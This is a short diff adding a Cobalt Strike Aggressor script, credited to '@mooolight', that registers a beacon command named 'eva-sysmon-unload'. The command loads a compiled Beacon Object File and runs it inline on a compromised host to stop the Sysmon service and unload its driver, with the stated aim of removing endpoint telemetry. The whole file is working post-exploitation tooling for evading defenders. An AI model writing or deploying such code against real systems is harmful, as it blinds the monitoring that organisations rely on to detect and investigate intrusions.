@@ -1,0 +1,23 @@
+# author @mooolight
+
+beacon_command_register(
+	"eva-sysmon-unload", "Unload the sysmon driver as well as disabling the process running it.",
+	"INFO:\nDisable the sysmon service and its corresponding driver to remove endpoint telemetry.\n\n" .
+	"ARGUMENTS:\n" .
+	"USAGE:\neva-sysmon-unload \n" .
+	"EXAMPLES:\neva-sysmon-unload \n");
+
+alias eva-sysmon-unload {
+    $bid = $1;
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("eva-sysmon-unload-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "");
+
+    blog($bid, "Disable the sysmon service and its corresponding driver to remove endpoint telemetry.");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
